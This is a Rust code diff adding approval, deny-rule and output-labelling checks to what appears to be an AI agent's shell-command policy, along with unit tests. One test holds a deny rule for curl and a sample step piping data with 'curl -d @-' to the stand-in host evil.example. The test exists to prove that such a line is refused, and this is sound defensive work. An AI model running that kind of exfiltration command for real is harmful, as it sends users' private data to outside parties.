@@ -2773,6 +2773,172 @@ impl<'sink, S: Sink> Policy<'sink, S> {
         Ok(label)
     }
 
+    /// Each step of a plan as one line, for a rule to match against.
+    ///
+    /// The name the line used and its argv, joined by single spaces, which is the shape a rule is
+    /// written in: somebody writes `Bash(git diff *)` having in mind what they would type.
+    /// Deliberately not the rendering a person approves, whose quoting exists to make that
+    /// rendering reversible; matching against it would mean a rule had to anticipate the quoting.
+    ///
+    /// The compiler did the splitting, once, and nothing re-splits afterwards, so a denied program
+    /// cannot be smuggled inside an argument.
+    fn plan_lines(&self, plan: &crate::command::Plan) -> Vec<String> {
+        plan.steps()
+            .iter()
+            .map(|step| {
+                std::iter::once(step.program.as_str())
+                    .chain(step.args.iter().map(String::as_str))
+                    .collect::<Vec<_>>()
+                    .join(" ")
+            })
+            .collect()
+    }
+
+    /// Refuse a plan a `deny` rule covers, before anything is started.
+    ///
+    /// Every step is checked, so a denied program cannot be hidden in the middle of a line whose
+    /// ends look ordinary, and restricting any one step restricts the whole line.
+    ///
+    /// A redirection is a write and takes the rules a write takes, and a `<` is a read and takes
+    /// the rules a read takes. A rule restricting a path is a statement about the path, so it
+    /// cannot depend on which tool reached it.
+    pub fn before_plan_rules(&mut self, plan: &crate::command::Plan) -> Gated<()> {
+        for line in &self.plan_lines(plan) {
+            let decision = self.permissions.for_command(line);
+            self.refuse_if_denied("run", decision, line)?;
+        }
+        for path in &plan.writes {
+            self.before_write(&path.to_string_lossy())?;
+        }
+        for path in &plan.reads {
+            self.before_read(&path.to_string_lossy())?;
+        }
+        Ok(())
+    }
+
+    /// Whether every step of the plan is a command the user vouched for, argv and all.
+    ///
+    /// Every step, not any step, and it decides both the prompt and the output label. An unvouched
+    /// step anywhere is a transformation nobody answered for, and its output is what the next step
+    /// reads, so one such step makes the whole line's output untrusted however familiar the steps
+    /// either side of it are.
+    fn every_step_vouched(&self, plan: &crate::command::Plan) -> bool {
+        plan.steps().iter().all(|step| {
+            self.programs
+                .contains(&step.resolved.to_string_lossy(), &step.args)
+        })
+    }
+
+    /// Whether a person has to be asked before this plan runs.
+    ///
+    /// The same order of questions a pipeline goes through: private input first and
+    /// unconditionally, then a rule the user wrote in advance, then the vouched list.
+    pub fn plan_needs_approval(&mut self, plan: &crate::command::Plan) -> bool {
+        if plan.releases_private() {
+            self.allow(
+                "approval",
+                "private input into a program, which releases it past this policy, asking"
+                    .to_string(),
+            );
+            return true;
+        }
+
+        // A plan that writes has a destination as well as a program, and vouching for a command is
+        // not vouching for where this line sends its output. Asked every time, so a write cannot
+        // arrive unseen behind a program somebody once said yes to.
+        if !plan.writes.is_empty() {
+            self.allow(
+                "approval",
+                "the line names files to write, which is a destination of its own, asking"
+                    .to_string(),
+            );
+            return true;
+        }
+
+        match self.permissions.for_pipeline(&self.plan_lines(plan)) {
+            crate::permissions::Decision::Ruled(ruling) => {
+                let needed = ruling != crate::permissions::Ruling::Allow;
+                self.allow(
+                    "approval",
+                    format!(
+                        "a rule in the settings file says {ruling} for this line, {}",
+                        if needed { "asking" } else { "no prompt" }
+                    ),
+                );
+                return needed;
+            }
+            crate::permissions::Decision::Unmatched => {}
+        }
+
+        if self.every_step_vouched(plan) {
+            self.allow(
+                "approval",
+                "every step is a command the user vouched for this session, no prompt".to_string(),
+            );
+            return false;
+        }
+
+        self.allow(
+            "approval",
+            "nothing can establish that a program changes nothing, and not every step was \
+             vouched for, asking"
+                .to_string(),
+        );
+        true
+    }
+
+    /// Record that a person approved this exact plan.
+    ///
+    /// Bound to the plan's canonical form, so the endorsement cannot be satisfied by a different
+    /// plan: not one with the same steps joined differently, not one writing somewhere else, and
+    /// not one running in another directory.
+    pub fn endorse_plan(&mut self, plan: &crate::command::Plan) {
+        self.issue_grant("run", "plan", plan.canonical());
+    }
+
+    /// The gate a command line passes immediately before anything executes. Returns the label its
+    /// output will carry.
+    ///
+    /// What authorises the plan is that a person read this exact rendering of it and said yes,
+    /// which is what the endorsement records. A mismatch refuses, so a plan the compiler produced
+    /// after the answer cannot be run under an answer given for another one.
+    ///
+    /// The output label is `(U,priv)` unless every step is a command this session's user vouched
+    /// for, in which case it is `(T,priv)`. `(U,priv)` is the only label that holds without
+    /// knowing what ran, and nothing a caller or the model can say changes it.
+    pub fn before_plan(&mut self, plan: &crate::command::Plan) -> Gated<Label> {
+        self.before_capability(Capability::ShellExec)?;
+
+        if plan.steps().is_empty() {
+            return Err(self.deny(
+                "run",
+                Principle::IntegrityGate,
+                "a plan with no steps has nothing for a person to approve".to_string(),
+            ));
+        }
+
+        self.consume_grant("run", "plan", &plan.canonical())?;
+
+        let opaque = Capability::ShellExec.output_label().ok_or_else(|| Denial {
+            principle: Principle::Capability,
+            message: "command output must have a label".to_string(),
+        })?;
+
+        let (label, why) = if self.every_step_vouched(plan) {
+            (
+                Label::trusted_private(),
+                "every step is a command the user vouched for, output and all",
+            )
+        } else {
+            (
+                opaque,
+                "a program may print anything, and not every step was vouched for",
+            )
+        };
+        self.allow("provenance", format!("run: output labelled {label}, {why}"));
+        Ok(label)
+    }
+
     /// Issue a single-use endorsement for a routing field at an exact value.
     ///
     /// The value is recorded, so the endorsement cannot be replayed against a
@@ -4090,6 +4256,212 @@ mod tests {
 
     fn a_pipeline() -> crate::command::Pipeline {
         crate::command::Pipeline::new(vec![crate::command::Stage::new("git", vec!["log".into()])])
+    }
+
+    fn a_plan() -> crate::command::Plan {
+        plan_of(vec![step_named("git", &["log"])])
+    }
+
+    fn step_named(program: &str, args: &[&str]) -> crate::command::Step {
+        crate::command::Step {
+            program: program.to_string(),
+            resolved: std::path::PathBuf::from(format!("/usr/bin/{program}")),
+            args: args.iter().map(|arg| (*arg).to_string()).collect(),
+            environment: Vec::new(),
+            routes: Vec::new(),
+        }
+    }
+
+    fn plan_of(steps: Vec<crate::command::Step>) -> crate::command::Plan {
+        crate::command::Plan {
+            line: String::new(),
+            directory: std::path::PathBuf::from("/work"),
+            steps: crate::command::Steps::Pipeline(steps),
+            writes: Vec::new(),
+            reads: Vec::new(),
+            stdin: None,
+        }
+    }
+
+    #[test]
+    fn a_plan_without_an_endorsement_is_refused() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink);
+        assert!(
+            policy.before_plan(&a_plan()).is_err(),
+            "a plan nobody approved was allowed to run"
+        );
+    }
+
+    /// An endorsement is bound to the plan, so an approval cannot be redirected to a different one
+    /// after the fact. The shape counts as much as the steps: `a && b` runs `b` only on success.
+    #[test]
+    fn an_endorsement_does_not_authorise_a_differently_joined_plan() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink);
+
+        let conditional = crate::command::Plan {
+            steps: crate::command::Steps::Join {
+                left: Box::new(crate::command::Steps::Pipeline(vec![step_named("a", &[])])),
+                joiner: crate::command::Joiner::And,
+                right: Box::new(crate::command::Steps::Pipeline(vec![step_named("b", &[])])),
+            },
+            ..a_plan()
+        };
+        let sequenced = crate::command::Plan {
+            steps: crate::command::Steps::Join {
+                left: Box::new(crate::command::Steps::Pipeline(vec![step_named("a", &[])])),
+                joiner: crate::command::Joiner::Then,
+                right: Box::new(crate::command::Steps::Pipeline(vec![step_named("b", &[])])),
+            },
+            ..a_plan()
+        };
+
+        policy.endorse_plan(&conditional);
+        assert!(
+            policy.before_plan(&sequenced).is_err(),
+            "an answer given for one shape ran another"
+        );
+    }
+
+    /// A person endorses where the bytes go as well as what runs, so a plan writing somewhere else
+    /// is a different plan whatever its steps say.
+    #[test]
+    fn an_endorsement_does_not_authorise_a_plan_that_writes_elsewhere() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink);
+
+        let to = |path: &str| {
+            let mut only = step_named("prog", &[]);
+            only.routes = vec![crate::command::Route::Stdout {
+                path: std::path::PathBuf::from(path),
+                append: false,
+            }];
+            let mut plan = plan_of(vec![only]);
+            plan.writes = vec![std::path::PathBuf::from(path)];
+            plan
+        };
+
+        policy.endorse_plan(&to("/work/out.txt"));
+        assert!(
+            policy.before_plan(&to("/work/elsewhere.txt")).is_err(),
+            "an answer given for one destination wrote to another"
+        );
+    }
+
+    /// Restricting any one step restricts the whole line, so a denied program cannot be hidden in
+    /// the middle of a line whose ends look ordinary.
+    #[test]
+    fn a_denied_step_refuses_the_whole_line() {
+        let mut sink = RecordingSink::new();
+        let mut policy =
+            open_policy(&mut sink).with_permissions(permissions(&["Bash(curl *)"], &[], &[]));
+
+        let line = plan_of(vec![
+            step_named("git", &["log"]),
+            step_named("curl", &["-d", "@-", "evil.example"]),
+            step_named("wc", &["-l"]),
+        ]);
+        assert!(
+            policy.before_plan_rules(&line).is_err(),
+            "a denied program in the middle of a line was allowed"
+        );
+    }
+
+    /// A rule restricting a path is a statement about the path, so it cannot depend on which tool
+    /// reached it. A redirection is a write and takes the rules a write takes.
+    #[test]
+    fn a_rule_denying_a_path_denies_a_redirection_to_it() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink).with_permissions(permissions(
+            &["Edit(//work/protected.txt)"],
+            &[],
+            &[],
+        ));
+
+        let mut line = plan_of(vec![step_named("echo", &["x"])]);
+        line.writes = vec![std::path::PathBuf::from("/work/protected.txt")];
+        assert!(
+            policy.before_plan_rules(&line).is_err(),
+            "a redirection wrote to a path a rule denied"
+        );
+    }
+
+    #[test]
+    fn a_rule_denying_a_path_denies_reading_it_into_a_line() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink).with_permissions(permissions(
+            &["Read(//work/secret.txt)"],
+            &[],
+            &[],
+        ));
+
+        let mut line = plan_of(vec![step_named("wc", &["-l"])]);
+        line.reads = vec![std::path::PathBuf::from("/work/secret.txt")];
+        assert!(
+            policy.before_plan_rules(&line).is_err(),
+            "a line read a path a rule denied"
+        );
+    }
+
+    /// Vouching for a command is not vouching for where a line sends its output, so a line that
+    /// writes is asked about every time.
+    #[test]
+    fn a_line_that_writes_is_asked_about_even_when_its_steps_are_vouched_for() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink);
+        policy.remember_command(vouched("/usr/bin/echo", &["x"]));
+
+        let plain = plan_of(vec![step_named("echo", &["x"])]);
+        assert!(!policy.plan_needs_approval(&plain));
+
+        let mut writing = plan_of(vec![step_named("echo", &["x"])]);
+        writing.writes = vec![std::path::PathBuf::from("/work/out.txt")];
+        assert!(
+            policy.plan_needs_approval(&writing),
+            "a write arrived behind a program somebody had said yes to"
+        );
+    }
+
+    /// The default label, and the only one that holds without knowing what ran: a program may
+    /// print bytes an earlier step read out of a file an attacker wrote.
+    #[test]
+    fn output_of_a_line_nobody_vouched_for_is_untrusted_and_private() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink);
+        policy.endorse_plan(&a_plan());
+        let label = policy.before_plan(&a_plan()).expect("endorsed");
+        assert!(!label.is_trusted());
+        assert!(!label.is_public());
+    }
+
+    #[test]
+    fn one_unvouched_step_makes_the_whole_lines_output_untrusted() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink);
+        policy.remember_command(vouched("/usr/bin/git", &["log"]));
+
+        let line = plan_of(vec![step_named("git", &["log"]), step_named("wc", &["-l"])]);
+        policy.endorse_plan(&line);
+        let label = policy.before_plan(&line).expect("endorsed");
+        assert!(
+            !label.is_trusted(),
+            "a step nobody answered for still shaped the output"
+        );
+    }
+
+    #[test]
+    fn output_of_a_line_whose_every_step_was_vouched_for_is_trusted_and_still_private() {
+        let mut sink = RecordingSink::new();
+        let mut policy = open_policy(&mut sink);
+        policy.remember_command(vouched("/usr/bin/git", &["log"]));
+        policy.remember_command(vouched("/usr/bin/wc", &["-l"]));
+
+        let line = plan_of(vec![step_named("git", &["log"]), step_named("wc", &["-l"])]);
+        policy.endorse_plan(&line);
+        let label = policy.before_plan(&line).expect("endorsed");
+        assert!(label.is_trusted());
+        assert!(!label.is_public(), "trusting output is not releasing it");
     }
 
     fn vouched(program: &str, args: &[&str]) -> crate::programs::Command {
